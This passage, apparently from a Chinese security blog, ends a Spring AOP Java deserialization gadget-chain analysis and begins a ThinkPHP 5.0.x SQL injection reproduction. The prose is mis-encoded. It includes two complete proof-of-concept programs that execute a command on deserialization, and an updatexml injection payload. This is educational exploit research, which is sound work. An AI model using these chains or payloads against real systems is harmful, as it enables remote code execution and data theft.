å±‚é¢æ¥è®²ï¼Œå‘ç°DefaultIntroductionAdvisorç±»åœ¨DefaultAdvisorChainFactoryç±»çš„getInterceptorsAndDynamicInterceptionAdvice()æ–¹æ³•ä¸­åº”è¯¥æ˜¯ä¼šè¿›å…¥åˆ°else ifè¯­å¥ï¼Œä½†æ˜¯æƒ³è¦æ·»åŠ ä¹Ÿæ˜¯éå¸¸å¥½æ§åˆ¶çš„ï¼š\nAdvisedSupportç±»ä¸­çš„æ–¹æ³•å®šä¹‰ï¼š preFilteredå˜é‡é»˜è®¤ä¸ºfalseï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡setPreFiltered()æ–¹æ³•å°†å…¶è®¾ç½®ä¸ºtrueï¼Œå…·ä½“å°±çœ‹è¦æ˜¯ä¸‹é¢çš„åˆ†æå‡ºé”™äº†å†åŠ å§ã€‚å½“ç„¶è¿˜å¯ä»¥æ§åˆ¶ç¬¬äºŒä¸ªï¼Œåæ­£ä¸º||ï¼Œä½†æ˜¯è¿™æ ·å°±éœ€è¦çœ‹targetClassçš„åŒ¹é…æƒ…å†µäº†ã€‚\nï¼‰\nå†çœ‹getInterceptors()æ–¹æ³•åç»­ä»£ç ï¼Œåªè¦getAdvice()æ–¹æ³•è¿”å›çš„ç±»å®ç°äº†Adviceæ¥å£å’ŒMethodInterceptoræ¥å£ï¼Œå°±å¯ä»¥å°†è¿™ä¸ªç±»æ”¾å…¥listä¸­ï¼Œè€Œæˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„æ˜¯æˆ‘ä»¬æƒ³è¦ä¼ å…¥çš„æ˜¯AspectJAroundAdviceç±»å®ä¾‹ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»AbstractAspectJAdviceå®ç°äº†Adviceæ¥å£ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚\nä½†æ˜¯è¿™é‡Œå…¶å®æœ‰ä¸¤æ¡é“¾å­ï¼ŒåŒºåˆ«ç‚¹ä¹Ÿæ˜¯åœ¨è¿™é‡Œï¼Œå¦å¤–ä¸€ç§æ–¹æ³•ä¹ŸæŒºæœ‰æ„æ€çš„ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼Œä¸¤æ¡é“¾å­ä¸»è¦çš„åŒºåˆ«å°±æ˜¯å¦‚ä¸‹ï¼š\næ‰¾ä¸€ä¸ªåŒæ—¶å®ç°äº†Adviceæ¥å£å’ŒMethodInterceptoræ¥å£å¹¶ä¸”å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œä¹Ÿå°±æ˜¯å‰é¢åˆ†æçš„ã€‚ ç¬¬äºŒä¸ªå°±æ˜¯å†åŠ ä¸€å±‚ä»£ç†ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯å†æ¬¡åˆ©ç”¨JdkDynamicAopProxyï¼Œé€šè¿‡JdkDynamicAopProxyæ¥åŒæ—¶ä»£ç†Adviceå’ŒMethodInterceptoræ¥å£ï¼Œå¹¶è®¾ç½®åå°„è°ƒç”¨å¯¹è±¡ï¼ˆtargetï¼‰æ˜¯AspectJAroundAdviceï¼Œä»è€Œå¯ä»¥åœ¨è°ƒç”¨åˆ°MethodInterceptoræ¥å£å¯¹åº”çš„æ–¹æ³•æ—¶ä¼šç»§ç»­é“¾å­çš„æ‰§è¡Œã€‚è¿™ä¸ªå°±æ˜¯å¯¹JdkDynamicAopProxyç±»çš„åˆ©ç”¨äº†ï¼Œéå¸¸å¼ºå¤§çš„ç±»å‘€ã€‚ æ‰€ä»¥è¿™é‡Œå…¶å®æœ‰ä¸¤æ¡é“¾å­ï¼Œä¸‹é¢åˆ†åˆ«å†ç»§ç»­è¯´ä¸€ä¸‹ã€‚\nPOCæ„é€  é“¾å­ä¸€ å‰é¢åˆ†æå¾—åŸºæœ¬å·²ç»éå¸¸æ¸…æ™°äº†ï¼ŒAspectJAroundAdviceç±»çš„çˆ¶ç±»AbstractAspectJAdvice(sinkç‚¹çš„ç±»)å®ç°äº†adviceæ¥å£ï¼Œæ‰€ä»¥å…¶å®å¯ä»¥ç›´æ¥å°è¯•åˆ©ç”¨ï¼Œé‚£ä¹ˆå°±ç”¨CC5çš„ååºåˆ—åŒ–è°ƒç”¨toString()æ–¹æ³•æ‰“ä¸€ä¸ªæ¥è§¦å‘ä»£ç†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AopProxy; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.support.DefaultIntroductionAdvisor; import javassist.*; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Method; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Method method1 = impl.getClass().getDeclaredMethod(\u0026#34;newTransformer\u0026#34;); AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); SingletonAspectInstanceFactory x1 = new SingletonAspectInstanceFactory(impl); AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(method1,pointcut,x1); DefaultIntroductionAdvisor decorator = new DefaultIntroductionAdvisor(aspectJAroundAdvice); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(impl); advisedSupport.addAdvisor(decorator); Class clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor constructor = clazz.getDeclaredConstructor(AdvisedSupport.class); constructor.setAccessible(true); //ä»£ç†è®¾ç½® InvocationHandler invocatinoHandler = (InvocationHandler) constructor.newInstance(advisedSupport); AopProxy proxy = (AopProxy) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{AopProxy.class},invocatinoHandler); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;,proxy); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } è¿è¡Œåå°±ç›´æ¥åœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºäº†ã€‚\nå†è°ƒè¯•ä¸€ä¸‹åŸºæœ¬è¿‡ç¨‹ï¼Œæœ‰ä¸åŒç‚¹ï¼š è¿™é‡Œä¸ºä»€ä¹ˆä¼šæœ‰å‘¢ï¼Œä¸åº”è¯¥æ˜¯ä¼šè¿›å…¥ifæ¡ä»¶å—ï¼Ÿç¼“å­˜é—®é¢˜ï¼Ÿæ²¡è°ƒå‡ºæ¥ï¼Œæä¸æ‡‚ï¼Ÿ\nè€Œå¯¹äºä¸ºä»€ä¹ˆè°ƒç”¨æ— å‚æ•°æ„é€ æ–¹æ³•ï¼Œå¯ä»¥è‡ªå·±å»è·Ÿä¸€ä¸‹è¿™é‡Œçš„è¿‡ç¨‹ã€‚\næ‰€ä»¥Gatgetå¦‚ä¸‹ï¼š\n1 2 3 4 5 JdkDynamicAopProxy#invoke()-\u0026gt; ReflectiveMethodInvocation#proceed()-\u0026gt; AspectJAroundAdvice#invoke()-\u0026gt; AbstractAspectJAdvice#invokeAdviceMethod()-\u0026gt; AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs() åŸºæœ¬å’Œé¢„æœŸç›¸åŒã€‚\né“¾å­äºŒ è¿™ä¸€æ¡é“¾å­ä¹Ÿæ˜¯éå¸¸æœ‰æ„æ€çš„ç‚¹ï¼Œå€¼å¾—å­¦ä¹ ï¼Œå…·ä½“è¿‡ç¨‹ä¸Šé¢æå‡ºæ¥çš„ç‚¹ä¹Ÿéå¸¸æ¸…æ™°äº†ï¼Œç®€å•æƒ³äº†ä¸€ä¸‹æµç¨‹ï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯åœ¨å¦‚ä¸‹åœ°æ–¹è§¦å‘ç¬¬äºŒæ¬¡JdkDynamicAopProxyçš„invoke()æ–¹æ³•ï¼š\nè€Œç¬¬äºŒæ¬¡è§¦å‘invoke()æ–¹æ³•çš„æµç¨‹å°±å’Œjacksonä¸ç¨³å®šæ€§è§£å†³çš„é“¾å­æµç¨‹æ˜¯ä¸€æ ·çš„äº†ï¼Œè¿™é‡Œä¸å¤šè¯´ã€‚\nç®€å•æ„é€ å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import org.aopalliance.aop.Advice; import org.aopalliance.intercept.MethodInterceptor; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AopProxy; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.support.DefaultIntroductionAdvisor; import javassist.*; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Method; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Method method1 = impl.getClass().getDeclaredMethod(\u0026#34;newTransformer\u0026#34;); AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); SingletonAspectInstanceFactory x1 = new SingletonAspectInstanceFactory(impl); AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(method1,pointcut,x1); Class clazz0 = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor constructor0 = clazz0.getDeclaredConstructor(AdvisedSupport.class); constructor0.setAccessible(true); AdvisedSupport advisedSupport0 = new AdvisedSupport(); advisedSupport0.setTarget(aspectJAroundAdvice); Advice proxy0 = (Advice) getProxy(constructor0,advisedSupport0,new Class[]{MethodInterceptor.class,Advice.class}); DefaultIntroductionAdvisor decorator = new DefaultIntroductionAdvisor(proxy0); AdvisedSupport advisedSupport1 = new AdvisedSupport(); advisedSupport1.setTarget(impl); advisedSupport1.addAdvisor(decorator); //ä»£ç†è®¾ç½® AopProxy proxy2 = (AopProxy) getProxy(constructor0,advisedSupport1,new Class[]{AopProxy.class}); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;,proxy2); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } public static Object getProxy(Constructor constructor,AdvisedSupport advised,Class[] interface1) throws Exception{ InvocationHandler invocatinoHandler = (InvocationHandler) constructor.newInstance(advised); Object proxy = (Object) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),interface1,invocatinoHandler); return proxy; } } æˆåŠŸåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºã€‚\nè°ƒè¯•çš„å”¯ä¸€ä¸åŒç‚¹å°±æ˜¯å¦‚ä¸‹ï¼š\nè¿™é‡Œè¿˜æ˜¯æ²¡æœ‰è¿›å…¥ifè¯­å¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä½†æ˜¯åé¢gaorenå¸®æˆ‘è·‘å°±èƒ½è¿›å…¥ifè¯­å¥ã€‚\næ‰€ä»¥Gatgetå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 JdkDynamicAopProxy#invoke()-\u0026gt; ReflectiveMethodInvocation#proceed()-\u0026gt; JdkDynamicAopProxy#invoke()-\u0026gt; AopUtils#invokeJoinpointUsingReflection()-\u0026gt; AspectJAroundAdvice#invoke()-\u0026gt; AbstractAspectJAdvice#invokeAdviceMethod()-\u0026gt; AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs() æ€»ç»“ éå¸¸æœ‰æ„æ€çš„é“¾å­å‘€ï¼ŒJdkDynamicAopProxyç±»çœŸçš„å¼ºå¤§ï¼Œåªè¦æ§åˆ¶å¾—å¥½ï¼Œå¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œä¸»è¦è¿˜æ˜¯çœ‹è§¦å‘invoke()çš„æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬å¯æ§åå°„ä¸­çš„invoke()ä¸­çš„ç±»å®ä¾‹ï¼Œéå¸¸æœ‰æ„æ€ã€‚\næœ€åï¼Œè¿™ä¸ªspringAOPé“¾æ˜¯ä¸€ä¸ªéå¸¸å¥½ç”¨çš„ç±»ï¼ŒåŸºæœ¬ä¸Šspringbootçš„ç¯å¢ƒéƒ½èƒ½æ‰“ï¼Œå¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„æ— å‚æ•°æ–¹æ³•ã€‚\nå‚è€ƒæ–‡ç« ï¼š https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ\nhttps://xz.aliyun.com/news/17640\nhttps://xz.aliyun.com/news/17530\n","date":"2025-03-27T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/springaop%E9%93%BE/","title":"SpringAOPé“¾"},{"content":"ThinkPHPæ¼æ´å¤ç° ThinkPHPæ˜¯ä¸€ä¸ªå…è´¹å¼€æºçš„ï¼Œå¿«é€Ÿã€ç®€å•çš„é¢å‘å¯¹è±¡çš„è½»é‡çº§PHPå¼€å‘æ¡†æ¶ã€‚ä¸‹é¢å°±å¯¹å‡ ä¸ªæ¼æ´ç‚¹è¿›è¡Œå­¦ä¹ ä»¥åŠå¤ç°ã€‚\né¦–å…ˆéœ€è¦é…ç½®å¥½xdebugç¯å¢ƒï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ï¼š\nhttps://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/\nThinkphp5 SQLæ³¨å…¥æ¼æ´ æ¼æ´ç‰ˆæœ¬ï¼š5.0.13\u0026lt;=ThinkPHP\u0026lt;=5.0.15\nâ€”â€”â€”â€”â€”â€”\nç¯å¢ƒæ­å»º è¿™é‡Œå†ç®€å•è¯´è¯´ç¯å¢ƒæ­å»ºï¼Œåé¢å…¶å®éƒ½å¤§å·®ä¸å·®çš„ã€‚åœ¨githubä¸Šä¸‹è½½v5.0.15çš„æºç ï¼Œç„¶ååœ¨å°çš®ä¸­æ­å»ºä¸€ä¸ªç½‘ç«™å³å¯ï¼Œä»¥composer.jsonæ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸ºæ ¹ç›®å½•ï¼Œç„¶åé…ç½®mysqlï¼Œç›´æ¥ä½¿ç”¨phpstudyä¸Šçš„å³å¯ï¼Œä½†æ˜¯éœ€è¦å¾€é‡Œé¢æ’å…¥æ•°æ®ï¼š\n1 2 3 create database tp_text; create table users(username varchar(20)); insert into users value (\u0026#34;fupanc\u0026#34;),(\u0026#34;test\u0026#34;); ç„¶åä¿®æ”¹éƒ¨åˆ†æºç ï¼Œåœ¨composer.jsonä¸­æŒ‡å®šç‰ˆæœ¬ï¼š\nè¿˜å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„phpç‰ˆæœ¬è¦æ±‚ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œå°±ç›´æ¥ä½¿ç”¨çš„7.3.4äº†ï¼Œç„¶ååœ¨è¿™ä¸ªç›®å½•ä¸‹ä½¿ç”¨composer installå°±åˆ›å»ºå¥½äº†ã€‚\nç„¶ååœ¨application/index/controller/Index.phpä¸­æ·»åŠ å…¥å£ç‚¹ï¼Œæ¨¡ä»¿ä¸€ä¸ªæ•°æ®æŸ¥è¯¢çš„éƒ¨åˆ†ï¼š\nå³\n1 2 $username = request()-\u0026gt;get(\u0026#39;username/a\u0026#39;); db(\u0026#39;users\u0026#39;)-\u0026gt;insert([\u0026#39;username\u0026#39;=\u0026gt;$username]); ç„¶åä¿®æ”¹æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼Œä½äºapplication/database.phpï¼š\nå†åœ¨application/config.phpå¼€å¯è°ƒè¯•ï¼š\n1 2 3 4 // åº”ç”¨è°ƒè¯•æ¨¡å¼ \u0026#39;app_debug\u0026#39; =\u0026gt; true, // åº”ç”¨Trace \u0026#39;app_trace\u0026#39; =\u0026gt; true, phpstormçš„é…ç½®å°±æ˜¯å‰é¢ç»™çš„æ–‡ç« ï¼Œå‚è€ƒé‚£ä¸ªæ¥é…å³å¯ï¼Œç®€å•ä¿®æ”¹ä¸€ä¸‹å¦‚äººå£è·¯å¾„ï¼š\næœ€åæˆåŠŸæ‰“ä¸Šæ–­ç‚¹ï¼š\nâ€”â€”â€”â€”\nè¿™é‡Œå…¶å®å°±æ˜¯è¦ä¼ å‚usernameï¼Œå¯ä»¥å…ˆç®€å•åŠ ä¸€ä¸ªå‚æ•°æ¥è°ƒè¯•ä¸€ä¸‹è¿‡ç¨‹ï¼Œç›´æ¥å¦‚ä¸‹é…ç½®å°±è¡Œï¼š\nä»£ç å®¡è®¡ å¼€å§‹å®¡è®¡ï¼Œæ‰“é€šçš„POCå¦‚ä¸‹ï¼š\n1 ?username[0]=inc\u0026amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)\u0026amp;username[2]=1 è¿˜æ˜¯å…ˆä»åŸé…ç½®çš„ä¼ å‚æ¥ï¼Œç®€å•è¯´æ˜ä¸€ä¸‹è¿™é‡Œçš„æ·»åŠ çš„å…¥å£çš„ä»£ç é€»è¾‘ï¼š\n1 2 $username = request()-\u0026gt;get(\u0026#39;username/a\u0026#39;); db(\u0026#39;users\u0026#39;)-\u0026gt;insert([\u0026#39;username\u0026#39;=\u0026gt;$username]); å¯¹äºç¬¬ä¸€è¡Œä»£ç ï¼Œå…ˆæ˜¯åˆå§‹åŒ–äº†ä¸€ä¸ªrequestå¯¹è±¡ï¼Œç„¶åè°ƒç”¨äº†get()å‡½æ•°ï¼Œè·Ÿè¿›è¿™ä¸ªget()å‡½æ•°ï¼š\nè¿™é‡Œçš„getåœ¨ç±»ä¸­çš„æœ€åˆå®šä¹‰æ˜¯ä¸€ä¸ªç©ºæ•°ç»„ï¼Œç„¶åä¼šå°†$_GETï¼ˆä¹Ÿå°±æ˜¯getä¼ å‚çš„å†…å®¹ï¼‰çš„å€¼å…¨éƒ¨èµ‹å€¼ç»™è¿™ä¸ªï¼Œç„¶åä¼šè°ƒç”¨input()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 public function input($data = [], $name = \u0026#39;\u0026#39;, $default = null, $filter = \u0026#39;\u0026#39;) { if (false === $name) { // è·å–åŸå§‹æ•°æ® return $data; } $name = (string) $name; if (\u0026#39;\u0026#39; != $name) { // è§£æname if (strpos($name, \u0026#39;/\u0026#39;)) { list($name, $type) = explode(\u0026#39;/\u0026#39;, $name); } else { $type = \u0026#39;s\u0026#39;; } // æŒ‰.æ‹†åˆ†æˆå¤šç»´æ•°ç»„è¿›è¡Œåˆ¤æ–­ foreach (explode(\u0026#39;.\u0026#39;, $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { // æ— è¾“å…¥æ•°æ®ï¼Œè¿”å›é»˜è®¤å€¼ return $default; } } if (is_object($data)) { return $data; } } // è§£æè¿‡æ»¤å™¨ $filter = $this-\u0026gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, \u0026#39;filterValue\u0026#39;], $filter); reset($data); } else { $this-\u0026gt;filterValue($data, $name, $filter); } if (isset($type) \u0026amp;\u0026amp; $data !== $default) { // å¼ºåˆ¶ç±»å‹è½¬æ¢ $this-\u0026gt;typeCast($data, $type); } return $data; } ç®€å•è¿‡ç¨‹ï¼Œä»å‰é¢å¯ä»¥çœ‹å‡ºæ¥å°±æ˜¯ä¸€äº›åˆ†å‰²æ“ä½œï¼Œåœ¨å‰é¢å‚æ•°çš„å®šä¹‰ä¸­ï¼Œusername/aä»£è¡¨çš„å°±æ˜¯æ¥æ”¶ä¸€ä¸ªæ•°ç»„ç±»å‹çš„usernameå‚æ•°ï¼Œç®€å•è¯´ä¸€ä¸‹åé¢çš„åˆ†å‰²æ“ä½œï¼š\nå‰é¢æœ‰ä¸€ä¸ªç”¨/åˆ†å‰²ï¼Œè·å–åˆ°äº†å‚æ•°çš„typeï¼Œç„¶åè¿™é‡Œè·å–åˆ°äº†ç”¨.æ¥åˆ†å‰²ï¼Œå…¶å®é€»è¾‘å°±æ˜¯è·å–åˆ°usernameçš„å€¼ï¼Œè¿™é‡Œæ˜¯fupancï¼Œæ‰€ä»¥ä¼šå°†$dataå€¼è®¾ç½®æˆäº†fupancï¼Œå¹¶ä¸”è¿™ä¸ªå€¼ä¸æ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè¿›å…¥åé¢çš„ifæ¡ä»¶ã€‚\nç»§ç»­å¾€åé¢çœ‹ï¼š\nè¿™é‡Œè°ƒç”¨äº†getFilter()å‡½æ•°ï¼Œå°±æ˜¯ä¸€ä¸ªè·å–è¿‡æ»¤å™¨çš„æ“ä½œï¼Œä½†æ˜¯æˆ‘è¿™é‡Œå¹¶æ²¡æœ‰ç‰¹åˆ«è®¾ç½®filterï¼Œæ‰€ä»¥å°±æ˜¯ä¸ºç©ºã€‚\nå†åé¢ï¼Œè¿™é‡Œæˆ‘æ˜¯ç›´æ¥ä¼ å‚çš„fupancï¼Œä¸æ˜¯æ•°ç»„ç±»å‹ï¼Œæ‰€ä»¥ä¸hiè¿›å…¥åé¢çš„ifè¯­å¥ï¼Œè€Œåœ¨elseè¯­å¥ä¸­ï¼Œå¯ä»¥çœ‹åˆ°çš„è°ƒç”¨äº†filterValue()å‡½æ•°ï¼š\nç±»çš„ä¼ å‚å¦‚ä¸Šï¼Œç„¶åè°ƒç”¨äº†array_pop()å‡½æ•°ï¼Œå°±æ˜¯å»æ‰æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚ä½†æ˜¯åé¢çš„is_callableå‡½æ•°æ˜¯æ²¡æœ‰é€šè¿‡çš„ï¼Œis_callable()å‡½æ•°å°±æ˜¯åˆ¤å®šæ˜¯å¦å¯ä»¥ä½œä¸ºä¸ºä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå¾ˆæ˜¾ç„¶è¿™é‡Œä¸è¡Œã€‚è€Œis_scalar()å‡½æ•°ï¼Œå°±æ˜¯æ£€æµ‹æ˜¯å¦æ˜¯ä¸€ä¸ªæ ‡é‡ï¼Œæ ‡é‡å˜é‡æ˜¯æŒ‡é‚£äº›åŒ…å«äº† integerã€floatã€string æˆ– boolean çš„å˜é‡ï¼Œè€Œ arrayã€object å’Œ resource åˆ™ä¸æ˜¯æ ‡é‡ã€‚è¿™é‡Œçš„is_scalarå‡½æ•°è™½ç„¶æ»¡è¶³äº†ï¼Œä½†æ˜¯åé¢çš„is_scalarå‡½æ•°é‡Œé¢å®šä¹‰çš„ifç­‰è¯­å¥éƒ½æ˜¯ä¸æ»¡è¶³çš„ï¼Œæ‰€ä»¥æœ€åä¼šç›´æ¥returnï¼š\nç„¶åå°±ä¼šè°ƒç”¨åˆ°filterExp()å‡½æ•°ï¼š\n1 2 3 4 5 6 7 8 public function filterExp(\u0026amp;$value) { // è¿‡æ»¤æŸ¥è¯¢ç‰¹æ®Šå­—ç¬¦ if (is_string($value) \u0026amp;\u0026amp; preg_match(\u0026#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i\u0026#39;, $value)) { $value .= \u0026#39; \u0026#39;; } // TODO å…¶ä»–å®‰å…¨è¿‡æ»¤ } è¿™é‡Œå°±æ˜¯ä¸€ä¸ªsqlæ³¨å…¥çš„é˜²å¾¡æœºåˆ¶ï¼Œå¤§å°å†™åŒ¹é…æ¥æ„å»ºwafï¼Œå¦‚æœåŒ¹é…åˆ°äº†å†…å®¹ï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥å°†valueåé¢åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œä½†æ˜¯æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªè¿‡æ»¤å¾—æ¯”è¾ƒä¸€èˆ¬å‘€ã€‚\næœ€åè°ƒç”¨å®ŒfilterEXPå’ŒfilterValueå‡½æ•°è¿‡åå°±å›åˆ°äº†input()å‡½æ•°ï¼š\næœ€åæœ‰ä¸€ä¸ªç±»å‹è½¬æ¢ï¼Œè¿™é‡Œå¾—$typeå˜é‡å°±æ˜¯åœ¨å‰é¢/åˆ†å‰²é‚£é‡Œåˆ†å‰²å‡ºæ¥çš„ã€‚æœ€åï¼Œç»è¿‡ç±»å‹è½¬æ¢åï¼Œè¿™é‡Œå°±ä¼šå°†dataçš„å€¼å˜æˆä¸€ä¸ªæ•°ç»„å¹¶å°†å…¶è¿”å›ï¼š\nä½†æ˜¯å¦‚æœæˆ‘ç›´æ¥ä¼ 